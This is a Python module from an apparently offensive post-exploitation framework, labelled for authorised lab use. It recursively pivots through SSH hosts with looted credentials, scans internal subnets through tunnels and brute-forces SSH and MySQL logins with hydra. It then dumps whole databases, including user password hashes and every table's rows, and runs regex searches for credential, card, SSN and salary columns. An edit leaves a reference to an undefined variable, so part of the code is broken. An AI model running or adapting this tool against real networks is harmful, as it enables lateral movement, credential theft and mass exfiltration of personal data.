#!/usr/bin/env python3
"""
post/pivot_scanner.py — Recursive Pivot Scanner
FOR AUTHORISED LAB USE ONLY.
"""

import ipaddress
import os
import re
import subprocess
import tempfile
import random
from collections import deque
import threading
import logging
logging.getLogger("paramiko.transport").setLevel(logging.CRITICAL)

from core.executor import safe_run
from core.logger import get_logger
from core.utils import make_out_dir
from config import get_profile, get_tool_path

MAX_DEPTH     = 5
MAX_NEW_HOSTS = 50


def run(ctx):
    log     = get_logger()
    log.banner("POST -- Recursive Pivot Scanner (TUNNEL MODE)")
    log.set_phase("pivot_scanner")

    profile = get_profile()
    out_dir = make_out_dir(ctx.out_dir, "post", "pivot_scanner")

    ssh_creds = [c for c in ctx.loot.get("credentials", [])
                 if c.get("service") == "ssh"]
    if not ssh_creds:
        log.info("No SSH credentials – skipping pivot scanner")
        return

    seen_cred_keys = set()
    unique_creds   = []
    for c in ssh_creds:
        host = c.get("host", "")
        user = c.get("user") or c.get("username", "")
        key  = f"{host}:{user}"
        if host and user and key not in seen_cred_keys:
            seen_cred_keys.add(key)
            unique_creds.append(c)
    ssh_creds = unique_creds
    log.info(f"Loaded {len(ssh_creds)} unique SSH credentials")

    seen_hosts    = set(ctx.live_hosts)
    seen_subnets  = _get_known_subnets(ctx)
    seen_services = set()   # "mysql:ip" and "ssh:ip" tracked separately
    new_total     = 0
    queue         = deque()
    added         = set()
    global_lock   = threading.Lock()

    for c in ssh_creds:
        host = c.get("host", "")
        user = c.get("user") or c.get("username", "")
        pwd  = c.get("password", "")
        key  = f"{host}:{user}"
        if host and user and key not in added:
            queue.append((host, user, pwd, 1, [], None))
            added.add(key)

    log.info(f"Starting recursive pivot with {len(queue)} SSH host(s)")

    while queue:
        host, user, pwd, depth, hop_chain, came_from = queue.popleft()

        if depth > MAX_DEPTH:
            log.info(f"  Max depth {MAX_DEPTH} reached at {host}")
            continue
        if new_total >= MAX_NEW_HOSTS:
            log.info(f"  Max new hosts ({MAX_NEW_HOSTS}) reached")
            break

        chain_str = " -> ".join([h for h,u,p in hop_chain] + [host]) if hop_chain else host
        log.info(f"")
        log.info(f"  ┌─[ Depth {depth} ] {'─'*45}")
        log.info(f"  │  Target : {host}  ({user})")
        log.info(f"  │  Chain  : {chain_str}")
        if came_from:
            log.info(f"  │  Entry  : via {came_from}")
        log.info(f"  └{'─'*53}")

        hdir   = make_out_dir(out_dir, host.replace(".", "_"))
        client = None

        try:
            client, err = _ssh_connect_chained(host, user, pwd, hop_chain, log)
            if not client:
                log.info(f"  SSH failed [{host}]: {err}")
                continue

            log.success(f"  Connected : {host}")
            all_subnets, own_ips = _get_all_subnets(client, host, log, ctx)
            own_ips = set(own_ips)

            if not all_subnets:
                log.info(f"  No subnets visible from {host} — dead end")
                continue

            # Determine which subnets are new (not came_from, not already scanned)
            new_subnets = []
            for subnet in all_subnets:
                if subnet == came_from:
                    log.info(f"  │  {subnet}  <-- came from here, skipping")
                    continue
                if subnet in seen_subnets:
                    log.info(f"  │  {subnet}  already scanned, skipping")
                    continue
                new_subnets.append(subnet)
                seen_subnets.add(subnet)
                log.info(f"  │  {subnet}  --> will scan")

            if not new_subnets:
                log.info(f"  No new subnets from {host} — dead end")
                continue

            try:
                with open(os.path.join(hdir, "subnets.txt"), "w") as f:
                    f.write(f"Via {host} (depth={depth}):\n" + "\n".join(all_subnets))
            except Exception:
                pass

            # Scan all new subnets in parallel — one thread per subnet
            # Session stays open until ALL threads finish
            def scan_subnet(subnet):
                nonlocal new_total
                log.info(f"")
                log.info(f"  >> Scanning {subnet} via {host}")

                # MySQL — tracked with "mysql:ip" key
                for mhost in _tunnel_port_scan(client, subnet, 3306, log):
                    if mhost in own_ips:
                        log.info(f"  Skipping {mhost} — own interface of {host}")
                        continue
                    with global_lock:
                        mkey = f"mysql:{mhost}"
                        if mkey in seen_services:
                            log.info(f"  MySQL {mhost} already done — skipping")
                            continue
                        seen_services.add(mkey)
                        if mhost not in seen_hosts:
                            seen_hosts.add(mhost)
                            new_total += 1
                    log.success(f"  MySQL found : {mhost}:3306  via {host}")
                    _mysql_brute_through_tunnel(ctx, client, mhost, 3306, hdir, log)

                # SSH — tracked with "ssh:ip" key — independent of MySQL
                for shost in _tunnel_port_scan(client, subnet, 22, log):
                    if shost in own_ips:
                        log.info(f"  Skipping {shost} — own interface of {host}")
                        continue
                    with global_lock:
                        skey = f"ssh:{shost}"
                        if skey in seen_services:
                            continue
                        seen_services.add(skey)
                        if shost not in seen_hosts:
                            seen_hosts.add(shost)
                            new_total += 1
                        if shost not in ctx.live_hosts:
                            ctx.live_hosts.add(shost)
                        ctx.open_ports.setdefault(shost, {"tcp": [22], "udp": []})

                    log.success(f"  SSH found   : {shost}:22  via {host}")

                    for nc in _ssh_brute_tunneled(ctx, client, shost, hdir, log):
                        key2 = f"{shost}:{nc.get('user') or nc.get('username')}"
                        with global_lock:
                            if key2 in added:
                                continue
                            added.add(key2)
                            new_chain = hop_chain + [(host, user, pwd)]
                            try:
                                came_from_net = str(ipaddress.ip_network(f"{host}/29", strict=False))
                            except Exception:
                                came_from_net = None
                            queue.append((
                                shost,
                                nc.get("user") or nc.get("username", ""),
                                nc.get("password", ""),
                                depth + 1,
                                new_chain,
                                came_from_net,
                            ))
                        log.success(f"")
                        log.success(f"  *** New Pivot : {chain_str} -> {shost}  [depth {depth+1}]")
                        log.success(f"  Credential   : {nc.get('user') or nc.get('username')}:{nc.get('password')}")
                        log.success(f"")

            # Launch one thread per new subnet — all run in parallel
            threads = [threading.Thread(target=scan_subnet, args=(s,), daemon=True)
                       for s in new_subnets]
            for t in threads:
                t.start()

            # Wait for every thread to finish before closing the session
            for t in threads:
                t.join()

            log.info(f"  All subnets from {host} scanned")

        except Exception as e:
            log.info(f"  Pivot error [{host}]: {e}")

        finally:
            if client:
                try:
                    for c2 in reversed(getattr(client, "_pivot_chain_clients", [])):
                        try: c2.close()
                        except: pass
                    client.close()
                except Exception:
                    pass
            log.info(f"  Session closed : {host}  (chain depth {len(hop_chain)})")

    log.success(f"Recursive pivot complete | new hosts discovered: {new_total}")


def _ssh_connect_chained(host, user, pwd, hop_chain, log):
    """
    Build full SSH tunnel chain from scratch.
    hop_chain = [(h1,u1,p1), (h2,u2,p2), ...]
    Scanner connects through each hop to reach final host.
    No commands run on pivot hosts.
    """
    import paramiko
    clients = []
    sock    = None

    try:
        for i, (hop_host, hop_user, hop_pwd) in enumerate(hop_chain):
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(hop_host, port=22, username=hop_user, password=hop_pwd,
                      sock=sock, timeout=10, auth_timeout=10,
                      look_for_keys=False, allow_agent=False)
            clients.append(c)

            # Next destination
            if i + 1 < len(hop_chain):
                next_host = hop_chain[i + 1][0]
            else:
                next_host = host

            try:
                sock = c.get_transport().open_channel(
                    "direct-tcpip", (next_host, 22), ("127.0.0.1", 0), timeout=10)
            except Exception as e:
                for c2 in reversed(clients):
                    try: c2.close()
                    except: pass
                return None, f"Channel open failed to {next_host}: {e}"

        # Final target connection
        final = paramiko.SSHClient()
        final.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        final.connect(host, port=22, username=user, password=pwd,
                      sock=sock, timeout=10, auth_timeout=10,
                      look_for_keys=False, allow_agent=False)
        final._pivot_chain_clients = clients
        return final, None

    except Exception as e:
        for c2 in reversed(clients):
            try: c2.close()
            except: pass
        return None, str(e)


def _get_all_subnets(client, host, log, ctx=None):
    """Only directly connected subnets — skip via routes. Also returns host own IPs."""
    all_nets = []
    own_ips  = set()
    try:
        _, stdout, _ = client.exec_command("ip route", timeout=10)
        out = stdout.read().decode("utf-8", errors="replace")
        log.info(f"[{host}] ip route:\n{out[:400]}")
        deep = getattr(ctx, "deep_pivot", False) if ctx else False
        for line in out.splitlines():
            # Collect own IPs from src field
            m = re.search(r"src\s+(\d+\.\d+\.\d+\.\d+)", line)
            if m:
                own_ips.add(m.group(1))
            if "via" in line and not deep:
                continue
            for cidr in re.findall(r"(\d+\.\d+\.\d+\.\d+/\d+)", line):
                try:
                    net = ipaddress.ip_network(cidr, strict=False)
                    if (net.is_loopback or net.is_link_local or
                            str(net).startswith("172.17.") or
                            str(net).startswith("192.168.") or
                            net.prefixlen >= 32 or
                            str(net) in all_nets):
                        continue
                    all_nets.append(str(net))
                except Exception:
                    pass
    except Exception as e:
        log.info(f"Remote cmd error [{host}]: {e}")
    return all_nets, own_ips


def _tunnel_port_scan(client, subnet, port, log):
    """Test each host:port through SSH direct-tcpip channel."""
    hosts = []
    try:
        net       = ipaddress.ip_network(subnet, strict=False)
        transport = client.get_transport()
        if not transport:
            log.info("No SSH transport available for tunnel scan")
            return hosts

        for ip in net.hosts():
            ip_str = str(ip)
            try:
                ch = transport.open_channel(
                    "direct-tcpip", (ip_str, port), ("127.0.0.1", 0), timeout=5)
                ch.close()
                hosts.append(ip_str)
                log.success(f"Tunnel: {port} open on {ip_str}")
            except Exception:
                continue
    except Exception as e:
        log.info(f"Tunnel port scan error on {subnet}:{port} -> {e}")
    return list(set(hosts))


def _ssh_brute_tunneled(ctx, ssh_client, host, out_dir, log):
    """
    Brute SSH through tunnel. Port forward stays open until hydra finishes.
    Only cancelled after subprocess.run returns.
    """
    hydra = get_tool_path("hydra")
    if not hydra:
        return []

    users = []
    pwds  = []
    try:
        with open("/home/ubuntu_user/ris602/wordlists/usernames.txt", "r") as f:
            users = [l.strip() for l in f if l.strip()]
    except Exception:
        pass
    try:
        with open("/home/ubuntu_user/ris602/wordlists/passwords_fast.txt", "r") as f:
            pwds = [l.strip() for l in f if l.strip()]
    except Exception:
        pass
    if not users or not pwds:
        return []

    transport = ssh_client.get_transport()
    if not transport:
        return []

    lp = random.randint(22000, 22100)
    fwd_srv = None
    try:
        fwd_srv = _local_forward(ssh_client, lp, host, 22)
        import time; time.sleep(0.5)  # let server start
    except Exception as e:
        log.info(f"Port-forward failed for SSH brute: {e}")
        return []

    uf = tempfile.mktemp(suffix=".txt")
    pf = tempfile.mktemp(suffix=".txt")
    found = []

    try:
        with open(uf, "w") as f:
            f.write("\n".join(users))
        with open(pf, "w") as f:
            f.write("\n".join(pwds))

        out_file = os.path.join(out_dir, f"hydra_ssh_{host.replace('.','_')}.txt")
        cmd = [hydra, "-L", uf, "-P", pf, "-t", "4", "-f",
               "-o", out_file, "-w", "10", "-s", str(lp), "127.0.0.1", "ssh"]
        log.info(f"Running tunneled SSH hydra: {' '.join(cmd)}")

        # subprocess.run BLOCKS until hydra finishes — port forward stays alive
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        import time; time.sleep(1)  # ensure file written before parsing

        for line in (r.stdout + r.stderr).splitlines():
            m = re.search(
                r"\[\d+\]\[ssh\]\s+host:\s+\S+\s+login:\s+(\S+)\s+password:\s+(\S+)",
                line, re.IGNORECASE)
            if m:
                u, p = m.group(1), m.group(2)
                cred = {"service": "ssh", "host": host, "port": 22,
                        "user": u, "username": u, "password": p, "source": "pivot"}
                ctx.loot.setdefault("credentials", []).append(cred)
                ctx.add_finding("CRITICAL", host, f"SSH cred via pivot: {u}:{p}", "")
                log.success(f"PIVOT SSH CRED | {host} | {u}:{p}")
                found.append(cred)

    except Exception as e:
        log.info(f"SSH brute error [{host}]: {e}")
    finally:
        # Stop forward server AFTER hydra finishes
        try:
            if fwd_srv: fwd_srv.stop()
        except: pass
        try: os.unlink(uf)
        except: pass
        try: os.unlink(pf)
        except: pass

    return found


def _mysql_brute_through_tunnel(ctx, ssh_client, host, port, out_dir, log):
    """
    Brute MySQL through tunnel then run full recon.
    Port forward stays open until hydra finishes then recon runs.
    """
    hydra = get_tool_path("hydra")
    if not hydra:
        return

    pass_wl = "/home/ubuntu_user/ris602/wordlists/mysql_passwords.txt"
    if not os.path.exists(pass_wl):
        log.info("mysql_passwords.txt not found")
        return

    lp = random.randint(33060, 33100)
    fwd_srv = None
    try:
        fwd_srv = _local_forward(ssh_client, lp, host, port)
        import time; time.sleep(0.5)
    except Exception as e:
        log.info(f"Port-forward failed for MySQL brute: {e}")
        return

    hdir     = make_out_dir(out_dir, f"{host.replace('.','_')}_mysql")
    out_file = os.path.join(hdir, f"hydra_mysql_{host.replace('.','_')}.txt")
    cracked_user = None
    cracked_pwd  = None

    try:
        cmd = [hydra, "-l", "root", "-P", pass_wl,
               "-s", str(lp), "-f", "-t", "4",
               "-o", out_file, "127.0.0.1", "mysql"]
        log.info(f"Running tunneled MySQL hydra: {' '.join(cmd)}")

        # Blocks until hydra finishes
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

        for line in (r.stdout + r.stderr).splitlines():
            m = re.search(
                r"\[\d+\]\[mysql\]\s+host:\s+\S+\s+login:\s+(\S+)\s+password:\s+(\S+)",
                line, re.IGNORECASE)
            if m:
                cracked_user = m.group(1)
                cracked_pwd  = m.group(2)
                log.success(f"MySQL PIVOT CRED | {host}:{port} | {cracked_user}:{cracked_pwd}")
                ctx.loot.setdefault("credentials", []).append({
                    "service": "mysql", "host": host, "port": port,
                    "user": cracked_user, "username": cracked_user,
                    "password": cracked_pwd, "source": "pivot",
                })
                ctx.add_finding("CRITICAL", host,
                                f"MySQL cred via pivot: {cracked_user}:{cracked_pwd}", "")
                break

        # Run full recon while port forward still open
        if cracked_user and cracked_pwd:
            _mysql_full_recon_tunneled(host, port, cracked_user, cracked_pwd,
                                       lp, hdir, log)
            log.info(f"MySQL pivot recon done: {host}")

    except Exception as e:
        log.info(f"MySQL brute error [{host}]: {e}")
    finally:
        # Stop forward AFTER brute and recon both finish
        try:
            if fwd_srv: fwd_srv.stop()
        except: pass

"""
def _mysql_full_recon_tunneled(host, port, user, pwd, lp, hdir, log):
#    Full MySQL recon using already-open port forward on lp.
#    Runs while parent tunnel is still alive.
    mysql_cli = get_tool_path("mysql")
    if not mysql_cli:
        return

    pw_flag = f"-p{pwd}" if pwd else "--password="
    queries = {
        "version":    "SELECT @@version, @@hostname, @@datadir;",
        "databases":  "SHOW DATABASES;",
        "users":      "SELECT host, user, authentication_string FROM mysql.user;",
        "privileges": "SHOW GRANTS;",
        "tables":     ("SELECT table_schema, table_name FROM information_schema.tables "
                       "WHERE table_schema NOT IN "
                       "('information_schema','performance_schema','sys','mysql');"),
        "file_priv":  "SELECT user, File_priv FROM mysql.user WHERE File_priv='Y';",
        "variables":  "SHOW VARIABLES LIKE 'secure_file_priv';",
        "data_sample": ("SELECT table_schema, table_name, column_name "
                        "FROM information_schema.columns "
                        "WHERE table_schema NOT IN "
                        "('information_schema','performance_schema','sys','mysql') "
                        "LIMIT 50;"),
    }

    all_output = [f"MySQL Recon: {host}:{port} ({user})\n" + "="*60]

    for label, query in queries.items():
        try:
            cmd = [mysql_cli, f"-h127.0.0.1", f"-P{lp}", f"-u{user}",
                   pw_flag, "--connect-timeout=15", "-e", query]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            rc = r.returncode
            out = r.stdout
            if rc == 0 and out.strip():
                result = out.strip()
                all_output.append(f"\n[{label.upper()}]\n{result}")
                try:
                    with open(os.path.join(hdir, f"{label}.txt"), "w") as f:
                        f.write(result)
                except Exception:
                    pass
                log.success(f"MySQL RECON | {host} | {label}: {result[:80]}")
        except Exception as e:
            log.info(f"MySQL recon [{label}] error: {e}")
"""
####EDIT DONE HERE##
def _mysql_full_recon_tunneled(host, port, user, pwd, lp, hdir, log):
    mysql_cli = get_tool_path("mysql")
    if not mysql_cli:
        return

    pw_flag = f"-p{pwd}" if pwd else "--password="
    
    def run_query(label, query, subdir=None):
        try:
            cmd = [mysql_cli, f"-h127.0.0.1", f"-P{lp}", f"-u{user}",
                   pw_flag, "--connect-timeout=15", "-e", query]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if r.returncode == 0 and r.stdout.strip():
                result = r.stdout.strip()
                save_dir = os.path.join(hdir, subdir) if subdir else hdir
                os.makedirs(save_dir, exist_ok=True)
                with open(os.path.join(save_dir, f"{label}.txt"), "w") as f:
                    f.write(result)
                log.success(f"MySQL RECON | {host} | {label}: {result[:80]}")
                return result
        except Exception as e:
            log.info(f"MySQL recon [{label}] error: {e}")
        return None

    # --- Phase 1: Instance-level recon ---
    instance_queries = {
        "version":       "SELECT @@version, @@hostname, @@datadir, @@basedir, @@port;",
        "databases":     "SHOW DATABASES;",
        "users":         "SELECT host, user, authentication_string, plugin FROM mysql.user;",
        "grants":        "SHOW GRANTS;",
        "all_grants":    ("SELECT CONCAT('SHOW GRANTS FOR ''', user, '''@''', host, ''';') "
                          "FROM mysql.user;"),
        "file_priv":     "SELECT user, host, File_priv FROM mysql.user WHERE File_priv='Y';",
        "secure_file":   "SHOW VARIABLES LIKE 'secure_file_priv';",
        "global_vars":   "SHOW GLOBAL VARIABLES;",
        "global_status": "SHOW GLOBAL STATUS;",
        "plugins":       "SHOW PLUGINS;",
        "schedulers":    "SELECT * FROM information_schema.EVENTS;",
        "processlist":   "SHOW FULL PROCESSLIST;",
        "linked_servers":"SELECT * FROM mysql.servers;",
    }
    for label, query in instance_queries.items():
        run_query(label, query, "instance")

    # --- Phase 2: Discover all user databases ---
    result = run_query("user_databases",
        "SELECT schema_name FROM information_schema.schemata "
        "WHERE schema_name NOT IN ('information_schema','performance_schema','sys','mysql');",
        "instance")
    
    user_dbs = []
    if result:
        for line in result.splitlines():
            line = line.strip()
            if line and line != "schema_name":
                user_dbs.append(line)
    
    log.info(f"MySQL | Found {len(user_dbs)} user databases: {user_dbs}")

    # --- Phase 3: Per-database deep dump ---
    for db in user_dbs:
        db_dir = os.path.join(hdir, "databases", db)
        os.makedirs(db_dir, exist_ok=True)
        log.info(f"MySQL | Dumping database: {db}")

        # All tables in this DB
        tables_result = run_query("tables",
            f"SELECT table_name, table_type, engine, table_rows, data_length "
            f"FROM information_schema.tables WHERE table_schema = '{db}';",
            f"databases/{db}")
        
        tables = []
        if tables_result:
            for line in tables_result.splitlines():
                parts = line.strip().split("\t")
                if parts and parts[0] != "table_name":
                    tables.append(parts[0])

        # All columns
        run_query("columns",
            f"SELECT table_name, column_name, data_type, column_type, is_nullable, column_key "
            f"FROM information_schema.columns WHERE table_schema = '{db}' ORDER BY table_name, ordinal_position;",
            f"databases/{db}")

        # All views
        run_query("views",
            f"SELECT table_name, view_definition FROM information_schema.views "
            f"WHERE table_schema = '{db}';",
            f"databases/{db}")

        # Stored procedures and functions
        run_query("routines",
            f"SELECT routine_name, routine_type, routine_definition "
            f"FROM information_schema.routines WHERE routine_schema = '{db}';",
            f"databases/{db}")

        # Triggers
        run_query("triggers",
            f"SELECT trigger_name, event_manipulation, event_object_table, action_statement "
            f"FROM information_schema.triggers WHERE trigger_schema = '{db}';",
            f"databases/{db}")

        # Foreign keys / relationships
        run_query("foreign_keys",
            f"SELECT constraint_name, table_name, column_name, referenced_table_name, referenced_column_name "
            f"FROM information_schema.key_column_usage "
            f"WHERE table_schema = '{db}' AND referenced_table_name IS NOT NULL;",
            f"databases/{db}")

        # --- Phase 4: Full table dumps ---
        for table in tables:
            table_dir = os.path.join(hdir, "databases", db, "tables")
            os.makedirs(table_dir, exist_ok=True)

            # Row count
            run_query(f"{table}_count",
                f"SELECT COUNT(*) as row_count FROM `{db}`.`{table}`;",
                f"databases/{db}/tables")

            # Full dump (all rows)
            run_query(f"{table}_data",
                f"SELECT * FROM `{db}`.`{table}`;",
                f"databases/{db}/tables")

            log.success(f"MySQL | Dumped table: {db}.{table}")

    # --- Phase 5: Cross-DB sensitive data search ---
    sensitive_queries = {
        "all_credentials": (
            "SELECT table_schema, table_name, column_name FROM information_schema.columns "
            "WHERE column_name REGEXP 'pass|pwd|secret|token|key|hash|credential|auth' "
            "AND table_schema NOT IN ('information_schema','performance_schema','sys','mysql');"),
        "all_emails": (
            "SELECT table_schema, table_name, column_name FROM information_schema.columns "
            "WHERE column_name REGEXP 'email|mail|contact' "
            "AND table_schema NOT IN ('information_schema','performance_schema','sys','mysql');"),
        "all_pii_columns": (
            "SELECT table_schema, table_name, column_name FROM information_schema.columns "
            "WHERE column_name REGEXP 'ssn|dob|birth|phone|address|salary|credit|card|account' "
            "AND table_schema NOT IN ('information_schema','performance_schema','sys','mysql');"),
    }
    for label, query in sensitive_queries.items():
        run_query(label, query, "sensitive_columns")

    # --- Phase 6: mysqldump binary dump per DB ---
    mysqldump = get_tool_path("mysqldump")
    if mysqldump:
        for db in user_dbs:
            dump_file = os.path.join(hdir, "databases", db, f"{db}_full.sql")
            try:
                cmd = [mysqldump, f"-h127.0.0.1", f"-P{lp}", f"-u{user}",
                       pw_flag, "--single-transaction", "--routines",
                       "--triggers", "--events", db]
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                if r.returncode == 0 and r.stdout.strip():
                    with open(dump_file, "w") as f:
                        f.write(r.stdout)
                    log.success(f"mysqldump complete: {db} -> {dump_file}")
            except Exception as e:
                log.info(f"mysqldump error [{db}]: {e}")

    log.success(f"MySQL full recon complete for {host}:{port}")

####EDIT ENDS HETE##
    try:
        with open(os.path.join(hdir, "full_recon.txt"), "w") as f:
            f.write("\n".join(all_output))
    except Exception:
        pass


def _get_known_subnets(ctx) -> set:
    known = set()
    try:
        known.add(str(ipaddress.ip_network(ctx.target, strict=False)))
    except Exception:
        pass
    for host in ctx.live_hosts:
        try:
            for prefix in [29, 28, 27, 26, 24]:
                net = ipaddress.ip_network(f"{host}/{prefix}", strict=False)
                known.add(str(net))
        except Exception:
            pass
    return known


def _local_forward(ssh_client, local_port, remote_host, remote_port):
    """Create a local port forward using a background thread."""
    import socket, threading
    import paramiko

    transport = ssh_client.get_transport()

    class ForwardServer(threading.Thread):
        def __init__(self):
            super().__init__(daemon=True)
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind(("127.0.0.1", local_port))
            self.server.listen(5)
            self.server.settimeout(1)
            self._stop = False

        def run(self):
            while not self._stop:
                try:
                    conn, _ = self.server.accept()
                except socket.timeout:
                    continue
                except Exception:
                    break
                try:
                    chan = transport.open_channel(
                        "direct-tcpip",
                        (remote_host, remote_port),
                        ("127.0.0.1", local_port),
                        timeout=10
                    )
                    t1 = threading.Thread(
                        target=_pipe, args=(conn, chan), daemon=True)
                    t2 = threading.Thread(
                        target=_pipe, args=(chan, conn), daemon=True)
                    t1.start(); t2.start()
                except Exception:
                    conn.close()

        def stop(self):
            self._stop = True
            try: self.server.close()
            except: pass

    srv = ForwardServer()
    srv.start()
    return srv


def _pipe(src, dst):
    try:
        while True:
            data = src.recv(1024)
            if not data:
                break
            dst.send(data)
    except Exception:
        pass
    finally:
        try: src.close()
        except: pass
        try: dst.close()
        except: pass
